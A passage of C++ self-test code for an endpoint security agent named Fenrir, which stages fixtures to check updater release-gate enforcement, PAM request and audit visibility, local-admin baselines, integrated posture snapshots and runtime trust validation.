                                   "Fenrir updater release-gate validation payload.\n")) {
            AddCheck(report, L"phase4_release_gate_blockers", L"Phase 4 release-gate blocker enforcement",
                     SelfTestStatus::Fail,
                     L"Self-test could not stage updater release-gate payload artifacts for Phase 4 validation.",
                     L"Validate release-gate fixture write permissions before rerunning self-test.");
          } else {
            const auto payloadSha256 = ComputeFileSha256(payloadPath);
            if (payloadSha256.size() != 64) {
              AddCheck(report, L"phase4_release_gate_blockers", L"Phase 4 release-gate blocker enforcement",
                       SelfTestStatus::Fail,
                       L"Self-test could not compute a valid SHA-256 hash for Phase 4 updater gate fixtures.",
                       L"Validate cryptography provider availability before rerunning self-test.");
            } else {
              auto releaseGateConfig = phase4Config;
              releaseGateConfig.runtimeDatabasePath = releaseGateRoot / L"release-gate-runtime.db";
              releaseGateConfig.updateRootPath = releaseGateRoot / L"updates";
              releaseGateConfig.platformVersion = L"platform-0.1.0";
              releaseGateConfig.enforceReleasePromotionGates = true;

              std::filesystem::create_directories(releaseGateConfig.runtimeDatabasePath.parent_path(),
                                                  releaseGatePathError);
              std::filesystem::create_directories(releaseGateConfig.updateRootPath, releaseGatePathError);
              if (releaseGatePathError) {
                AddCheck(report, L"phase4_release_gate_blockers", L"Phase 4 release-gate blocker enforcement",
                         SelfTestStatus::Fail,
                         L"Self-test could not prepare isolated updater runtime roots for release-gate validation.",
                         L"Ensure update/runtime fixture roots are writable before rerunning self-test.");
              } else {
                struct ReleaseGateScenario {
                  std::wstring id;
                  std::wstring expectedError;
                  int selfTestPassPercent;
                  int patchTestPassPercent;
                  int ransomwareTestPassPercent;
                  int upgradeRollbackPassPercent;
                  int crashBudgetPpm;
                  int falsePositiveBudgetPpm;
                  int rollbackBudgetPpm;
                  bool hotfixRequired;
                  std::wstring promotionGate;
                  std::wstring approvalTicket;
                };

                const std::vector<ReleaseGateScenario> scenarios = {
                    ReleaseGateScenario{
                        .id = L"pass-rate-threshold",
                        .expectedError = L"test pass rates do not meet promotion thresholds",
                        .selfTestPassPercent = 98,
                        .patchTestPassPercent = 99,
                        .ransomwareTestPassPercent = 99,
                        .upgradeRollbackPassPercent = 99,
                        .crashBudgetPpm = 25,
                        .falsePositiveBudgetPpm = 10,
                        .rollbackBudgetPpm = 50,
                        .hotfixRequired = false,
                        .promotionGate = L"approved",
                        .approvalTicket = L"CHG-PHASE4-SELFTEST"},
                    ReleaseGateScenario{
                        .id = L"risk-budget-threshold",
                        .expectedError = L"risk budgets exceed promotion thresholds",
                        .selfTestPassPercent = 99,
                        .patchTestPassPercent = 99,
                        .ransomwareTestPassPercent = 99,
                        .upgradeRollbackPassPercent = 99,
                        .crashBudgetPpm = 45,
                        .falsePositiveBudgetPpm = 10,
                        .rollbackBudgetPpm = 50,
                        .hotfixRequired = false,
                        .promotionGate = L"approved",
                        .approvalTicket = L"CHG-PHASE4-SELFTEST"},
                    ReleaseGateScenario{
                        .id = L"hotfix-required",
                        .expectedError = L"hotfix-only handling",
                        .selfTestPassPercent = 99,
                        .patchTestPassPercent = 99,
                        .ransomwareTestPassPercent = 99,
                        .upgradeRollbackPassPercent = 99,
                        .crashBudgetPpm = 25,
                        .falsePositiveBudgetPpm = 10,
                        .rollbackBudgetPpm = 50,
                        .hotfixRequired = true,
                        .promotionGate = L"approved",
                        .approvalTicket = L"CHG-PHASE4-SELFTEST"},
                    ReleaseGateScenario{
                        .id = L"missing-approval-ticket",
                        .expectedError = L"missing an approval ticket",
                        .selfTestPassPercent = 99,
                        .patchTestPassPercent = 99,
                        .ransomwareTestPassPercent = 99,
                        .upgradeRollbackPassPercent = 99,
                        .crashBudgetPpm = 25,
                        .falsePositiveBudgetPpm = 10,
                        .rollbackBudgetPpm = 50,
                        .hotfixRequired = false,
                        .promotionGate = L"approved",
                        .approvalTicket = L""},
                };

                const auto BuildManifest =
                    [&payloadSha256](const ReleaseGateScenario& scenario) {
                      std::wstring manifest;
                      manifest += L"package_id=phase4-release-gate-" + scenario.id + L"\n";
                      manifest += L"package_type=platform\n";
                      manifest += L"target_version=platform-9.9.9\n";
                      manifest += L"channel=stable\n";
                      manifest += L"trust_domain=platform\n";
                      manifest += L"promotion_track=stable\n";
                      manifest += L"promotion_gate=" + scenario.promotionGate + L"\n";
                      manifest += L"approval_ticket=" + scenario.approvalTicket + L"\n";
                      manifest += L"package_signer=Fenrir Self-Test Signer\n";
                      manifest += L"signing_key_id=fenrir-platform-prod-2026\n";
                      manifest += L"crash_budget_ppm=" + std::to_wstring(scenario.crashBudgetPpm) + L"\n";
                      manifest += L"false_positive_budget_ppm=" + std::to_wstring(scenario.falsePositiveBudgetPpm) +
                                  L"\n";
                      manifest += L"rollback_budget_ppm=" + std::to_wstring(scenario.rollbackBudgetPpm) + L"\n";
                      manifest += L"self_test_pass_percent=" + std::to_wstring(scenario.selfTestPassPercent) + L"\n";
                      manifest += L"patch_test_pass_percent=" + std::to_wstring(scenario.patchTestPassPercent) + L"\n";
                      manifest +=
                          L"ransomware_test_pass_percent=" + std::to_wstring(scenario.ransomwareTestPassPercent) + L"\n";
                      manifest += L"upgrade_rollback_pass_percent=" +
                                  std::to_wstring(scenario.upgradeRollbackPassPercent) + L"\n";
                      manifest += L"hotfix_required=" +
                                  std::wstring(scenario.hotfixRequired ? L"true" : L"false") + L"\n";
                      manifest += L"allow_downgrade=false\n";
                      manifest += L"file=payload/phase4-release-gate.bin|bin/phase4-release-gate.bin|" +
                                  payloadSha256 + L"||false\n";
                      return manifest;
                    };

                UpdaterService updaterService(releaseGateConfig, releaseGateInstallRoot);
                std::vector<std::wstring> scenarioFailures;
                for (const auto& scenario : scenarios) {
                  const auto manifestPath = releaseGatePackageRoot / (L"phase4-release-gate-" + scenario.id + L".manifest");
                  if (!WriteSelfTestUtf8File(manifestPath, BuildManifest(scenario))) {
                    scenarioFailures.push_back(scenario.id + L": could not write manifest fixture");
                    continue;
                  }

                  const auto result = updaterService.ApplyPackage(manifestPath, UpdateApplyMode::Maintenance);
                  if (result.success) {
                    scenarioFailures.push_back(scenario.id + L": manifest unexpectedly applied");
                    continue;
                  }

                  if (!ContainsCaseInsensitive(result.errorMessage, scenario.expectedError)) {
                    scenarioFailures.push_back(scenario.id + L": unexpected error -> " + result.errorMessage);
                  }
                }

                if (scenarioFailures.empty()) {
                  AddCheck(report, L"phase4_release_gate_blockers", L"Phase 4 release-gate blocker enforcement",
                           SelfTestStatus::Pass,
                           L"Updater promotion-gate checks blocked all staged stable-channel manifests that violated pass-rate, risk-budget, hotfix, or approval-ticket requirements.");
                } else {
                  AddCheck(report, L"phase4_release_gate_blockers", L"Phase 4 release-gate blocker enforcement",
                           SelfTestStatus::Fail,
                           L"Updater promotion-gate checks did not reject all malformed release manifests. Failures: " +
                               std::accumulate(std::next(scenarioFailures.begin()), scenarioFailures.end(),
                                               scenarioFailures.front(),
                                               [](std::wstring left, const std::wstring& right) {
                                                 return left + L"; " + right;
                                               }) +
                               L".",
                           L"Validate release-gate enforcement so stable-channel promotion always blocks low pass-rates, risk-budget overruns, hotfix-only manifests, and missing approval tickets.");
                }
              }
            }
          }
        }
      }
    } catch (const std::exception& error) {
      AddCheck(report, L"phase4_patch_policy_roundtrip", L"Phase 4 patch-policy roundtrip", SelfTestStatus::Fail,
               L"Phase 4 patch policy validation failed: " + Utf8ToWide(error.what()),
               L"Validate isolated patch orchestrator runtime paths and database mappings before rerunning self-test.");
      AddCheck(report, L"phase4_windows_patch_state_refresh", L"Phase 4 Windows patch-state refresh",
               SelfTestStatus::Fail, L"Phase 4 patch refresh validation failed: " + Utf8ToWide(error.what()),
               L"Validate Windows and software patch discovery flow before rerunning self-test.");
      AddCheck(report, L"phase4_software_patch_recipe_coverage", L"Phase 4 software patch recipe coverage",
               SelfTestStatus::Fail, L"Phase 4 patch recipe validation failed: " + Utf8ToWide(error.what()),
               L"Validate recipe catalog seeding and reload the patch orchestrator before rerunning self-test.");
      AddCheck(report, L"phase4_patch_visibility_snapshot", L"Phase 4 patch visibility snapshot", SelfTestStatus::Fail,
               L"Phase 4 patch visibility validation failed: " + Utf8ToWide(error.what()),
               L"Validate patch snapshot persistence and reporting surfaces before rerunning self-test.");
      AddCheck(report, L"phase4_release_gate_blockers", L"Phase 4 release-gate blocker enforcement",
          SelfTestStatus::Fail, L"Phase 4 release-gate validation failed: " + Utf8ToWide(error.what()),
          L"Validate updater manifest policy gate enforcement and rerun self-test.");
    }

    try {
      auto phase5Config = config;
      phase5Config.runtimeDatabasePath = phaseValidationRoot / L"phase5-runtime.db";
      phase5Config.stateFilePath = phaseValidationRoot / L"phase5-state.ini";
      phase5Config.telemetryQueuePath = phaseValidationRoot / L"phase5-telemetry.tsv";
      phase5Config.updateRootPath = phaseValidationRoot / L"phase5-updates";
      phase5Config.journalRootPath = phaseValidationRoot / L"phase5-journal";
      phase5Config.quarantineRootPath = phaseValidationRoot / L"phase5-quarantine";
      phase5Config.evidenceRootPath = phaseValidationRoot / L"phase5-evidence";
      phase5Config.scanExcludedPaths.clear();

      std::error_code phase5PathError;
      std::filesystem::create_directories(phase5Config.runtimeDatabasePath.parent_path(), phase5PathError);
      std::filesystem::create_directories(phase5Config.journalRootPath, phase5PathError);
      std::filesystem::create_directories(phase5Config.updateRootPath, phase5PathError);
      std::filesystem::create_directories(phase5Config.quarantineRootPath, phase5PathError);
      std::filesystem::create_directories(phase5Config.evidenceRootPath, phase5PathError);

      if (phase5PathError) {
        AddCheck(report, L"phase5_pam_request_queue_visibility", L"Phase 5 PAM request queue visibility",
                 SelfTestStatus::Fail,
                 L"Self-test could not prepare isolated Phase 5 runtime paths under " + phaseValidationRoot.wstring() + L".",
                 L"Ensure runtime and journal roots are writable before running Phase 5 PAM checks.");
        AddCheck(report, L"phase5_pam_audit_visibility", L"Phase 5 PAM audit visibility", SelfTestStatus::Fail,
                 L"Self-test could not prepare isolated Phase 5 runtime paths under " + phaseValidationRoot.wstring() + L".",
                 L"Ensure runtime and journal roots are writable before running Phase 5 PAM checks.");
        AddCheck(report, L"phase5_admin_membership_audit", L"Phase 5 local-admin membership audit",
                 SelfTestStatus::Fail,
                 L"Self-test could not prepare isolated Phase 5 runtime paths under " + phaseValidationRoot.wstring() + L".",
                 L"Ensure runtime and journal roots are writable before running Phase 5 PAM checks.");
      } else {
        const auto phase5RuntimeRoot = phase5Config.runtimeDatabasePath.parent_path();
        const auto phase5RequestPath = phase5RuntimeRoot / L"pam-request.json";
        const auto phase5AuditPath = phase5Config.journalRootPath / L"privilege-requests.jsonl";

        const auto phase5RequestPayload =
            L"{\"requestedAt\":\"" + JsonEscape(CurrentUtcTimestamp()) +
            L"\",\"requester\":\"selftest-user\",\"action\":\"run_application_timed\",\"targetPath\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"arguments\":\"/c whoami\",\"reason\":\"Self-test Phase 5 timed request\"}";
        const auto phase5AuditPayload =
            L"{\"timestamp\":\"" + JsonEscape(CurrentUtcTimestamp()) +
            L"\",\"requestedAt\":\"" + JsonEscape(CurrentUtcTimestamp()) +
            L"\",\"requester\":\"selftest-user\",\"action\":\"run_application_timed\",\"target\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"reason\":\"Self-test approval\",\"decision\":\"approved\",\"detail\":\"Launched process id 4242\",\"approvalSource\":\"policy\",\"durationSeconds\":120,\"terminationOutcome\":\"pending\"}\n"
            L"{\"timestamp\":\"" + JsonEscape(CurrentUtcTimestamp()) +
            L"\",\"requestedAt\":\"" + JsonEscape(CurrentUtcTimestamp()) +
            L"\",\"requester\":\"guest-user\",\"action\":\"run_powershell\",\"target\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\"reason\":\"Denied by policy\",\"decision\":\"denied\",\"detail\":\"Requester is not permitted\",\"approvalSource\":\"policy\",\"durationSeconds\":0,\"terminationOutcome\":\"n/a\"}\n";

        if (!WriteSelfTestUtf8File(phase5RequestPath, phase5RequestPayload) ||
            !WriteSelfTestUtf8File(phase5AuditPath, phase5AuditPayload)) {
          AddCheck(report, L"phase5_pam_request_queue_visibility", L"Phase 5 PAM request queue visibility",
                   SelfTestStatus::Fail,
                   L"Self-test could not stage PAM request/audit artifacts for Phase 5 validation.",
                   L"Validate runtime and journal write permissions before rerunning Phase 5 checks.");
          AddCheck(report, L"phase5_pam_audit_visibility", L"Phase 5 PAM audit visibility", SelfTestStatus::Fail,
                   L"Self-test could not stage PAM request/audit artifacts for Phase 5 validation.",
                   L"Validate runtime and journal write permissions before rerunning Phase 5 checks.");
        } else {
          const auto phase5Snapshot = LoadEndpointClientSnapshot(phase5Config, 10, 10, 10, 10);

          if (phase5Snapshot.pendingPamRequestCount >= 1 &&
              (phase5Snapshot.pamHealthState == L"healthy" || phase5Snapshot.pamHealthState == L"degraded")) {
            AddCheck(report, L"phase5_pam_request_queue_visibility", L"Phase 5 PAM request queue visibility",
                     SelfTestStatus::Pass,
                     L"Endpoint snapshot surfaced pending PAM requests and PAM health posture from local runtime paths.");
          } else {
            AddCheck(report, L"phase5_pam_request_queue_visibility", L"Phase 5 PAM request queue visibility",
                     SelfTestStatus::Fail,
                     L"Endpoint snapshot did not surface pending PAM request state from the staged runtime payload.",
                     L"Validate PAM request-path resolution and snapshot projection before promoting Phase 5.");
          }

          if (phase5Snapshot.pamApprovedCount >= 1 && phase5Snapshot.pamDeniedCount >= 1) {
            AddCheck(report, L"phase5_pam_audit_visibility", L"Phase 5 PAM audit visibility", SelfTestStatus::Pass,
                     L"Endpoint snapshot exposed PAM approval/denial counts from the local audit journal.");
          } else {
            AddCheck(report, L"phase5_pam_audit_visibility", L"Phase 5 PAM audit visibility", SelfTestStatus::Fail,
                     L"Endpoint snapshot did not surface both approval and denial PAM audit outcomes from the staged journal.",
                     L"Validate PAM audit journal parsing so elevation approvals and denials stay visible to users and support workflows.");
          }

          if (phase5Snapshot.localAdminExposureKnown) {
            AddCheck(report, L"phase5_admin_membership_audit", L"Phase 5 local-admin membership audit",
                     SelfTestStatus::Pass,
                     L"Fenrir resolved local Administrators membership posture with " +
                         std::to_wstring(phase5Snapshot.localAdminMemberCount) +
                         L" member(s); exposure state is " +
                         std::wstring(phase5Snapshot.localAdminExposure ? L"elevated" : L"reduced") + L".");
          } else {
            AddCheck(report, L"phase5_admin_membership_audit", L"Phase 5 local-admin membership audit",
                     SelfTestStatus::Warning,
                     L"Fenrir could not resolve local Administrators membership posture in this host context.",
                     L"Run self-test from a host context that allows local group membership enumeration.");
          }
        }
      }

      const auto householdRolePolicy = QueryHouseholdRolePolicySnapshot();
      std::wstring householdRolePolicyError;
      const auto householdRolePolicyValid =
          ValidateHouseholdRolePolicySnapshot(householdRolePolicy, &householdRolePolicyError);
      if (!householdRolePolicyValid) {
        AddCheck(report, L"phase5_household_role_policy_governance",
                 L"Phase 5 household role propagation governance", SelfTestStatus::Fail,
                 householdRolePolicyError.empty()
                     ? L"Fenrir detected an invalid household role policy state while validating local role propagation."
                     : householdRolePolicyError,
                 L"Apply local.household.roles.apply with non-overlapping trusted/restricted SID sets and a valid owner SID.");
      } else if (householdRolePolicy.ownerSid.empty()) {
        AddCheck(report, L"phase5_household_role_policy_governance",
                 L"Phase 5 household role propagation governance", SelfTestStatus::Warning,
                 L"Fenrir validated household role policy SID lists, but owner SID is not configured yet.",
                 L"Set the owner SID through local.household.roles.apply before enforcing long-lived household role governance.");
      } else {
        AddCheck(report, L"phase5_household_role_policy_governance",
                 L"Phase 5 household role propagation governance", SelfTestStatus::Pass,
                 L"Fenrir validated household role policy with owner SID and non-overlapping trusted/restricted SID sets (trusted=" +
                     std::to_wstring(householdRolePolicy.trustedHouseholdSids.size()) +
                     L", restricted=" + std::to_wstring(householdRolePolicy.restrictedHouseholdSids.size()) + L").");
      }

      try {
        RuntimeDatabase phase5Database(phase5Config.runtimeDatabasePath);
        const auto baselineId = GenerateGuidString();
        const auto capturedAt = CurrentUtcTimestamp();
        const std::vector<LocalAdminBaselineMemberRecord> baselineRecords = {
            LocalAdminBaselineMemberRecord{
                .baselineId = baselineId,
                .capturedAt = capturedAt,
                .capturedBy = L"self-test-phase5",
                .accountName = L"NT AUTHORITY\\SYSTEM",
                .sid = L"S-1-5-18",
                .memberClass = L"service_identity",
                .protectedMember = true,
                .managedCandidate = false,
            },
            LocalAdminBaselineMemberRecord{
                .baselineId = baselineId,
                .capturedAt = capturedAt,
                .capturedBy = L"self-test-phase5",
                .accountName = L"SELFTEST\\UnmanagedAdmin",
                .sid = L"S-1-5-21-123456789-111111111-222222222-1337",
                .memberClass = L"unmanaged_local_admin",
                .protectedMember = false,
                .managedCandidate = true,
            }};

        phase5Database.ReplaceLocalAdminBaselineSnapshot(baselineId, capturedAt, L"self-test-phase5", baselineRecords);
        const auto persistedRecords = phase5Database.ListLocalAdminBaselineSnapshot(baselineId);
        const auto latestRecords = phase5Database.ListLatestLocalAdminBaselineSnapshot();

        if (persistedRecords.size() >= baselineRecords.size() && latestRecords.size() >= baselineRecords.size()) {
          AddCheck(report, L"phase5_admin_baseline_persistence", L"Phase 5 admin baseline persistence",
                   SelfTestStatus::Pass,
                   L"Runtime database persisted local admin baseline snapshot records and latest-baseline lookup succeeded.");
        } else {
          AddCheck(report, L"phase5_admin_baseline_persistence", L"Phase 5 admin baseline persistence",
                   SelfTestStatus::Fail,
                   L"Runtime database baseline persistence returned fewer records than expected during roundtrip validation.",
                   L"Validate local_admin_baseline schema migration and baseline snapshot persistence paths.");
        }
      } catch (const std::exception& error) {
        AddCheck(report, L"phase5_admin_baseline_persistence", L"Phase 5 admin baseline persistence",
                 SelfTestStatus::Fail,
                 L"Runtime database local admin baseline persistence validation failed: " + Utf8ToWide(error.what()),
                 L"Validate local admin baseline persistence migrations and runtime database path health.");
      }
    } catch (const std::exception& error) {
      AddCheck(report, L"phase5_pam_request_queue_visibility", L"Phase 5 PAM request queue visibility",
               SelfTestStatus::Fail, L"Phase 5 PAM request visibility validation failed: " + Utf8ToWide(error.what()),
               L"Validate PAM runtime path staging and snapshot projection before rerunning self-test.");
      AddCheck(report, L"phase5_pam_audit_visibility", L"Phase 5 PAM audit visibility", SelfTestStatus::Fail,
               L"Phase 5 PAM audit visibility validation failed: " + Utf8ToWide(error.what()),
               L"Validate PAM journal parsing and snapshot projection before rerunning self-test.");
      AddCheck(report, L"phase5_admin_membership_audit", L"Phase 5 local-admin membership audit",
               SelfTestStatus::Fail, L"Phase 5 local-admin membership validation failed: " + Utf8ToWide(error.what()),
               L"Validate local-admin posture collection before rerunning self-test.");
      AddCheck(report, L"phase5_household_role_policy_governance",
               L"Phase 5 household role propagation governance", SelfTestStatus::Fail,
               L"Phase 5 household role governance validation failed: " + Utf8ToWide(error.what()),
               L"Validate household role SID policy parsing and local policy propagation before rerunning self-test.");
      AddCheck(report, L"phase5_admin_baseline_persistence", L"Phase 5 admin baseline persistence",
           SelfTestStatus::Fail,
           L"Phase 5 local admin baseline persistence validation failed: " + Utf8ToWide(error.what()),
           L"Validate runtime database baseline persistence and migration paths before rerunning self-test.");
    }

    try {
      auto phase6Config = config;
      phase6Config.runtimeDatabasePath = phaseValidationRoot / L"phase6-runtime.db";
      phase6Config.stateFilePath = phaseValidationRoot / L"phase6-state.ini";
      phase6Config.telemetryQueuePath = phaseValidationRoot / L"phase6-telemetry.tsv";
      phase6Config.updateRootPath = phaseValidationRoot / L"phase6-updates";
      phase6Config.journalRootPath = phaseValidationRoot / L"phase6-journal";
      phase6Config.quarantineRootPath = phaseValidationRoot / L"phase6-quarantine";
      phase6Config.evidenceRootPath = phaseValidationRoot / L"phase6-evidence";
      phase6Config.scanExcludedPaths.clear();

      std::error_code phase6PathError;
      std::filesystem::create_directories(phase6Config.runtimeDatabasePath.parent_path(), phase6PathError);
      std::filesystem::create_directories(phase6Config.journalRootPath, phase6PathError);
      std::filesystem::create_directories(phase6Config.updateRootPath, phase6PathError);
      std::filesystem::create_directories(phase6Config.quarantineRootPath, phase6PathError);
      std::filesystem::create_directories(phase6Config.evidenceRootPath, phase6PathError);

      if (phase6PathError) {
        AddCheck(report, L"phase6_integrated_posture_snapshot", L"Phase 6 integrated posture snapshot",
                 SelfTestStatus::Fail,
                 L"Self-test could not prepare isolated Phase 6 runtime paths under " + phaseValidationRoot.wstring() + L".",
                 L"Ensure runtime, patch, and journal roots are writable before running Phase 6 integration checks.");
        AddCheck(report, L"phase6_posture_output_coverage", L"Phase 6 local posture output coverage",
                 SelfTestStatus::Fail,
                 L"Self-test could not prepare isolated Phase 6 runtime paths under " + phaseValidationRoot.wstring() + L".",
                 L"Ensure runtime, patch, and journal roots are writable before running Phase 6 integration checks.");
      } else {
        RuntimeDatabase phase6Database(phase6Config.runtimeDatabasePath);
        phase6Database.RecordScanHistory(ScanHistoryRecord{
            .recordedAt = CurrentUtcTimestamp(),
            .source = L"realtime-broker",
            .subjectPath = phaseValidationRoot / L"phase6-threat-sample.ps1",
            .sha256 = L"phase6-threat-sha256",
            .contentType = L"script",
            .reputation = L"user-writable-unsigned",
            .disposition = L"block",
            .confidence = 98,
            .tacticId = L"TA0040",
            .techniqueId = L"T1486",
            .remediationStatus = L"pending",
            .evidenceRecordId = L"phase6-evidence-1",
            .quarantineRecordId = L""});

        phase6Database.ReplaceWindowsUpdateRecords({WindowsUpdateRecord{
            .updateId = L"phase6-kb5040001",
            .revision = L"1",
            .title = L"2026-05 Security Cumulative Update",
            .kbArticles = L"KB5040001",
            .categories = L"Security Updates",
            .classification = L"security",
            .severity = L"Critical",
            .updateType = L"software",
            .deploymentAction = L"installation",
            .discoveredAt = CurrentUtcTimestamp(),
            .lastAttemptAt = CurrentUtcTimestamp(),
            .status = L"failed",
            .failureCode = L"0x80240022",
            .detailJson = L"{\"phase\":\"install\"}",
            .installed = false,
            .hidden = false,
            .downloaded = true,
            .mandatory = true,
            .browseOnly = false,
            .rebootRequired = true,
            .driver = false,
            .featureUpdate = false,
            .optional = false}});

        phase6Database.ReplaceSoftwarePatchRecords({
            SoftwarePatchRecord{
                .softwareId = L"phase6-manual-app",
                .displayName = L"Contoso Legacy Tool",
                .displayVersion = L"3.2",
                .availableVersion = L"3.3",
                .publisher = L"Contoso",
                .provider = L"manual",
                .providerId = L"",
                .supportedSource = L"manual",
                .updateState = L"manual",
                .updateSummary = L"User interaction required.",
                .lastCheckedAt = CurrentUtcTimestamp(),
                .manualOnly = true,
                .userInteractionRequired = true,
                .highRisk = true},
            SoftwarePatchRecord{
                .softwareId = L"phase6-unsupported-app",
                .displayName = L"Unsupported Utility",
                .displayVersion = L"1.0",
                .availableVersion = L"",
                .publisher = L"Legacy Publisher",
                .provider = L"manual",
                .providerId = L"",
                .supportedSource = L"unsupported",
                .updateState = L"unsupported",
                .updateSummary = L"No trusted update source.",
                .lastCheckedAt = CurrentUtcTimestamp(),
                .supported = false}});

        phase6Database.UpsertPatchHistoryRecord(PatchHistoryRecord{
            .recordId = L"phase6-history-1",
            .targetType = L"windows-update",
            .targetId = L"phase6-kb5040001",
            .title = L"2026-05 Security Cumulative Update",
            .provider = L"windows-update-agent",
            .action = L"install",
            .status = L"failed",
            .startedAt = CurrentUtcTimestamp(),
            .completedAt = CurrentUtcTimestamp(),
            .errorCode = L"0x80240022",
            .detailJson = L"{\"stage\":\"install\"}",
            .rebootRequired = true});

        phase6Database.SaveRebootCoordinator(RebootCoordinatorRecord{
            .rebootRequired = true,
            .pendingWindowsUpdate = true,
            .pendingFileRename = false,
            .pendingComputerRename = false,
            .pendingComponentServicing = true,
            .rebootReasons = L"windows_update;component_servicing",
            .detectedAt = CurrentUtcTimestamp(),
            .deferredUntil = L"",
            .gracePeriodMinutes = 120,
            .status = L"pending"});

        const auto phase6RuntimeRoot = phase6Config.runtimeDatabasePath.parent_path();
        const auto phase6RequestPath = phase6RuntimeRoot / L"pam-request.json";
        const auto phase6AuditPath = phase6Config.journalRootPath / L"privilege-requests.jsonl";
        const auto phase6RequestPayload =
            L"{\"requestedAt\":\"" + JsonEscape(CurrentUtcTimestamp()) +
          L"\",\"requester\":\"selftest-user\",\"action\":\"run_windows_update\",\"targetPath\":\"C:\\\\Windows\\\\System32\\\\control.exe\",\"arguments\":\"\",\"reason\":\"Phase 6 patch workflow request\"}";
        const auto phase6AuditPayload =
            L"{\"timestamp\":\"" + JsonEscape(CurrentUtcTimestamp()) +
            L"\",\"requestedAt\":\"" + JsonEscape(CurrentUtcTimestamp()) +
          L"\",\"requester\":\"selftest-user\",\"action\":\"run_windows_update\",\"target\":\"C:\\\\Windows\\\\System32\\\\control.exe\",\"reason\":\"Phase 6 patch workflow request\",\"decision\":\"approved\",\"detail\":\"Launched process id 5151\",\"approvalSource\":\"policy\",\"durationSeconds\":0,\"terminationOutcome\":\"completed\"}\n";

        if (!WriteSelfTestUtf8File(phase6RequestPath, phase6RequestPayload) ||
            !WriteSelfTestUtf8File(phase6AuditPath, phase6AuditPayload)) {
          AddCheck(report, L"phase6_integrated_posture_snapshot", L"Phase 6 integrated posture snapshot",
                   SelfTestStatus::Fail,
                   L"Self-test could not stage PAM integration artifacts for Phase 6 snapshot validation.",
                   L"Validate PAM runtime and journal path permissions before rerunning Phase 6 checks.");
          AddCheck(report, L"phase6_posture_output_coverage", L"Phase 6 local posture output coverage",
                   SelfTestStatus::Fail,
                   L"Self-test could not stage PAM integration artifacts for Phase 6 snapshot validation.",
                   L"Validate PAM runtime and journal path permissions before rerunning Phase 6 checks.");
        } else {
          const auto phase6Snapshot = LoadEndpointClientSnapshot(phase6Config, 20, 20, 20, 20);

          const auto hasFailedWindowsUpdate = std::any_of(
              phase6Snapshot.windowsUpdates.begin(), phase6Snapshot.windowsUpdates.end(),
              [](const auto& update) { return update.updateId == L"phase6-kb5040001" && update.status == L"failed"; });
          const auto manualSoftwareCount = std::count_if(
              phase6Snapshot.softwarePatches.begin(), phase6Snapshot.softwarePatches.end(),
              [](const auto& software) { return software.manualOnly || software.updateState == L"manual"; });
          const auto unsupportedSoftwareCount = std::count_if(
              phase6Snapshot.softwarePatches.begin(), phase6Snapshot.softwarePatches.end(),
              [](const auto& software) { return !software.supported || software.updateState == L"unsupported"; });

          if (phase6Snapshot.openThreatCount >= 1 && hasFailedWindowsUpdate &&
              phase6Snapshot.rebootCoordinator.rebootRequired && phase6Snapshot.pendingPamRequestCount >= 1 &&
              phase6Snapshot.pamApprovedCount >= 1 && phase6Snapshot.localAdminExposureKnown) {
            AddCheck(report, L"phase6_integrated_posture_snapshot", L"Phase 6 integrated posture snapshot",
                     SelfTestStatus::Pass,
                     L"Unified endpoint snapshot exposed threat, patch debt, reboot state, PAM queue/history, and local-admin posture signals together.");
          } else {
            AddCheck(report, L"phase6_integrated_posture_snapshot", L"Phase 6 integrated posture snapshot",
                     SelfTestStatus::Fail,
                     L"Unified endpoint snapshot did not preserve all cross-feature protection signals required for Phase 6 integration.",
                     L"Validate endpoint snapshot projection so AV, patching, PAM, reboot, and admin posture state remain visible in one local model.");
          }

          if (!phase6Snapshot.patchHistory.empty() && manualSoftwareCount >= 1 && unsupportedSoftwareCount >= 1 &&
              !phase6Snapshot.windowsUpdates.empty() && phase6Snapshot.pamApprovedCount >= 1) {
            AddCheck(report, L"phase6_posture_output_coverage", L"Phase 6 local posture output coverage",
                     SelfTestStatus::Pass,
                     L"Local posture output preserved patch history, manual/unsupported software debt, Windows update status, and PAM decision history for dashboard/reporting surfaces.");
          } else {
            AddCheck(report, L"phase6_posture_output_coverage", L"Phase 6 local posture output coverage",
                     SelfTestStatus::Fail,
                     L"Local posture output is missing one or more required integration surfaces for patch, PAM, or compliance reporting.",
                     L"Validate posture projection so dashboard and reporting views can explain missing patches, reboot risk, PAM outcomes, and admin exposure.");
          }
        }
      }
    } catch (const std::exception& error) {
      AddCheck(report, L"phase6_integrated_posture_snapshot", L"Phase 6 integrated posture snapshot",
               SelfTestStatus::Fail, L"Phase 6 integrated snapshot validation failed: " + Utf8ToWide(error.what()),
               L"Validate endpoint snapshot integration for AV, patching, PAM, and admin posture signals before rerunning self-test.");
      AddCheck(report, L"phase6_posture_output_coverage", L"Phase 6 local posture output coverage",
               SelfTestStatus::Fail, L"Phase 6 posture output validation failed: " + Utf8ToWide(error.what()),
               L"Validate local posture output projection and dashboard/reporting coverage before rerunning self-test.");
    }

    try {
      const auto baselineRuntimeTrust = ValidateRuntimeTrust(config, installRoot);

      auto mismatchConfig = config;
      const auto mismatchRoot = phaseValidationRoot / L"phase3-runtime-mismatch";
      mismatchConfig.runtimeDatabasePath = mismatchRoot / L"agent-runtime.db";
      mismatchConfig.stateFilePath = mismatchRoot / L"agent-state.ini";
      mismatchConfig.telemetryQueuePath = mismatchRoot / L"telemetry-queue.tsv";
      mismatchConfig.updateRootPath = mismatchRoot / L"updates";
      mismatchConfig.journalRootPath = mismatchRoot / L"journal";
      mismatchConfig.quarantineRootPath = mismatchRoot / L"quarantine";
      mismatchConfig.evidenceRootPath = mismatchRoot / L"evidence";

      const auto mismatchRuntimeTrust = ValidateRuntimeTrust(mismatchConfig, installRoot);
      if (baselineRuntimeTrust.trusted && !mismatchRuntimeTrust.trusted) {
        AddCheck(report, L"phase3_runtime_trust_fail_closed", L"Phase 3 runtime trust fail-closed validation",
                 SelfTestStatus::Pass,
                 L"Runtime trust accepted the active runtime markers but rejected a mismatched runtime-root configuration."
                 L" Baseline: " + baselineRuntimeTrust.message + L" | Mismatch rejection: " +
                     mismatchRuntimeTrust.message);
      } else {
        AddCheck(report, L"phase3_runtime_trust_fail_closed", L"Phase 3 runtime trust fail-closed validation",
                 SelfTestStatus::Fail,
                 L"Runtime trust did not show strict fail-closed behavior across baseline and mismatched runtime-root checks."
                 L" BaselineTrusted=" +
